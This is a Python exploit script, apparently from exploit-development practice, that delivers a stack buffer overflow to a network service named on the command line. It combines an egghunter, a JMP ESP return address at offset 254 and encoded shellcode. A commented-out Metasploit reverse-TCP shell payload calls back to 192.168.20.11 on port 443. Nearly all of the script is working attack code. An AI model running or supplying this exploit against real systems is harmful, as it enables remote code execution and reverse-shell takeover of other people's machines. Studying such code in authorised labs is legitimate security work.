#!/usr/bin/python

import argparse
import sys
import socket

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

offset_srp = 254
# 00401D09  |. 5D             POP EBP

ptr_jmp_esp = '\x09\x1D\x40'
# ptr_jmp_esp = struct.pack('<I', 0x401D09)
buf_len = 1000
# http_method = '\xCC'
http_method = "\xb0\x03\x04\x01\x7B\x14"  # MOV AL, 3; ADD AL, 1; JPO 14
# badchars = [0x00, 0x0A, 0x0D]
# [*] Exact match at offset 254

# buf = '\x41' * offset_srp

shell = "R0cX" + "R0cX"
shell += "\xbf\xf0\xde\x1c\xaf\xda\xc7\xd9\x74\x24\xf4\x58\x2b"
shell += "\xc9\xb1\x31\x31\x78\x13\x03\x78\x13\x83\xc0\xf4\x3c"
shell += "\xe9\x53\x1c\x42\x12\xac\xdc\x23\x9a\x49\xed\x63\xf8"
shell += "\x1a\x5d\x54\x8a\x4f\x51\x1f\xde\x7b\xe2\x6d\xf7\x8c"
shell += "\x43\xdb\x21\xa2\x54\x70\x11\xa5\xd6\x8b\x46\x05\xe7"
shell += "\x43\x9b\x44\x20\xb9\x56\x14\xf9\xb5\xc5\x89\x8e\x80"
shell += "\xd5\x22\xdc\x05\x5e\xd6\x94\x24\x4f\x49\xaf\x7e\x4f"
shell += "\x6b\x7c\x0b\xc6\x73\x61\x36\x90\x08\x51\xcc\x23\xd9"
shell += "\xa8\x2d\x8f\x24\x05\xdc\xd1\x61\xa1\x3f\xa4\x9b\xd2"
shell += "\xc2\xbf\x5f\xa9\x18\x35\x44\x09\xea\xed\xa0\xa8\x3f"
shell += "\x6b\x22\xa6\xf4\xff\x6c\xaa\x0b\xd3\x06\xd6\x80\xd2"
shell += "\xc8\x5f\xd2\xf0\xcc\x04\x80\x99\x55\xe0\x67\xa5\x86"
shell += "\x4b\xd7\x03\xcc\x61\x0c\x3e\x8f\xef\xd3\xcc\xb5\x5d"
shell += "\xd3\xce\xb5\xf1\xbc\xff\x3e\x9e\xbb\xff\x94\xdb\x24"
shell += "\xe2\x3c\x11\xcd\xbb\xd4\x98\x90\x3b\x03\xde\xac\xbf"
shell += "\xa6\x9e\x4a\xdf\xc2\x9b\x17\x67\x3e\xd1\x08\x02\x40"
shell += "\x46\x28\x07\x23\x09\xba\xcb\x8a\xac\x3a\x69\xd3"

# msfpayload windows/shell_reverse_tcp LHOST=192.168.20.11 LPORT=443 C
# buffer2 = "R0cX" + "R0cX"
# buffer2 += ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
#         "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
#         "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
#         "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
#         "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
#         "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
#         "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
#         "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
#         "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
#         "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
#         "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
#         "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
#         "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
#         "\x68\xc0\xa8\x14\x0b\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
#         "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
#         "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
#         "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
#         "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
#         "\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
#         "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
#         "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

buf = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"  # egghunter searching for R0cX
buf += "\x90" * (offset_srp - len(buf))
buf += ptr_jmp_esp

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ap.rhost, ap.rport))
    sent = s.send(http_method + ' /%' + buf + "\r\n\r\n" + shell)
    data = s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("[+] Check for crash in debugger.")
    sys.exit()
